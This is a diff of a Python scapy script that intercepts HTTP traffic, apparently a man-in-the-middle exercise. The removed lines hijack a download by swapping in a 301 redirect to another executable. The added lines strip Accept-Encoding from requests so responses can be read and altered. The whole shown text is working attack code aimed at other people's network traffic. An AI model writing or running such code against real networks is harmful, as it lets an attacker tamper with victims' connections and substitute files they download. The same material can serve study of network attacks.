@@ -5,10 +5,9 @@ import scapy.all as scapy
 import re
 
 
-def get_modified_packet(packet):
-    ack_list.remove(packet[scapy.TCP].seq)
+def set_load(packet, mod_load):
     print('[+] replacing file')
-    packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-611.exe\n\n'
+    packet[scapy.Raw].load = mod_load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
@@ -21,9 +20,9 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:
             print('[+] Request')
             modified_load = re.sub(
-                'Accept-Encoding:.*?\\n\\n', scapy_packet[scapy.Raw].load)
+                'Accept-Encoding:.*?\\n\\n', '', str(scapy_packet[scapy.Raw].load))
             new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            packet.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Request')
             print(scapy_packet.show())
